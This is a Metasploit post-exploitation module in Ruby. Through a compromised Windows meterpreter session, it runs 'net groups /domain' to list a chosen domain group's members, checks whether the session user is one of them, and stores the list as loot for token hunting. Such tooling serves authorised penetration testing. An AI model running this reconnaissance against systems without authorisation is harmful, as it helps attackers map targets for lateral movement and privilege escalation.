##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Gather Enumerate Domain Group',
      'Description'   => %q( This module extracts user accounts from specified group
        and stores the results in the loot. It will also verify if session
        account is in the group. Data is stored in loot in a format that
        is compatible with the token_hunter plugin. This module should be
        run over as session with domain credentials.),
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'Stephen Haywood <haywoodsb[at]gmail.com>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
    register_options(
      [
        OptString.new('GROUP', [true, 'Domain Group to enumerate', nil])
      ])
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    cur_domain, cur_user = client.sys.config.getuid.split("\\")
    ltype = "domain.group.members"
    ctype = "text/plain"

    # Get Data
    usr_res = cmd_exec("net groups \"#{datastore['GROUP']}\" /domain")

    # Parse Returned data
    members = get_members(usr_res.split("\n"))
    domain = get_env("USERDOMAIN")

    # Show results if we have any, Error if we don't
    if !members.empty?

      print_status("Found users in #{datastore['GROUP']}")

      loot = []
      members.each do |user|
        print_status("\t#{domain}\\#{user}")
        loot << "#{domain}\\#{user}"
      end

      # Is our current user a member of this domain and group
      if is_member(cur_domain, cur_user, domain, members)
        print_good("Current sessions running as #{cur_domain}\\#{cur_user} is a member of #{datastore['GROUP']}!")
      else
        print_status("Current session running as #{cur_domain}\\#{cur_user} is not a member of #{datastore['GROUP']}")
      end

      # Store the captured data in the loot.
      loot_file = store_loot(ltype, ctype, session, loot.join("\n"), nil, datastore['GROUP'])
      print_good("User list stored in #{loot_file}")
    else
      print_error("No members found for #{datastore['GROUP']}")
    end
  end

  def get_members(results)
    members = []

    # Usernames start somewhere around line 6
    results = results.slice(6, results.length)
    # Get group members from the output
    results.each do |line|
      line.split("  ").compact.each do |user|
        next if user.strip == ""
        next if user =~ /-----/
        next if user =~ /The command completed successfully/
        members << user.strip
      end
    end

    members
  end

  def is_member(cur_dom, cur_user, dom, users)
    member = false

    if cur_dom == dom
      users.each do |u|
        if u.downcase == cur_user.downcase
          member = true
          break
        end
      end
    end

    member
  end
end
